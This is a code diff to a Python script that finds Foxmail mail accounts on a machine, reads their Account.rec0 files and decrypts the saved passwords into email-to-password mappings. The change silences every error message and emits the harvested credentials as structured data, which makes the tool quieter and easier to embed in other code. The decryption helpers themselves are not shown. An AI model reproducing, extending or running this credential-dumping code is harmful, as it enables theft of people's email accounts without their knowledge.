@@ -135,22 +135,35 @@ def get_email_accounts():
     return storages
 
 def foxmail_password_recovery():
-    accounts = get_email_accounts()
+    try:
+        accounts = get_email_accounts()
+    except Exception as e:
+        # print(f"[ERROR] 获取邮箱账户路径失败: {e}")
+        return {}
     emails = extract_emails_from_paths(accounts)
-    passwd_map = {}
+    users = []
     for email in emails:
-        account_path = get_account_path(email)
-
-        if not os.path.exists(account_path):
-            print(f"{email} Account.rec0 file not found.")
+        passwd_map = {}
+        try:
+            account_path = get_account_path(email)
+            if not os.path.exists(account_path):
+                # print(f"[WARNING] {email} 的 Account.rec0 文件未找到: {account_path}")
+                continue
+            content = read_file(account_path)
+            client_type = get_client_type(content)
+            password_hex = find_password(content)
+            password = decrypt_password(client_type, password_hex)
+            passwd_map[email] = password
+        except Exception as e:
+            # print(f"[ERROR] 解析 {email} 的密码失败: {e}")
             continue
-        content = read_file(account_path)
-        client_type = get_client_type(content)
-        password_hex = find_password(content)
-        password = decrypt_password(client_type, password_hex)
-        passwd_map[email] = password
-    return passwd_map
+        users.append(passwd_map)
+    return users
 
 if __name__ == "__main__":
-    foxmail_user = foxmail_password_recovery()
-    print (f"foxmail_user: {foxmail_user}")
+    try:
+        foxmail_user = foxmail_password_recovery()
+        print({"data": foxmail_user})
+    except Exception as e:
+        # print(f"[FATAL] 执行过程中出现致命错误: {e}")
+        raise ValueError(f"[FATAL] 执行过程中出现致命错误: {e}")
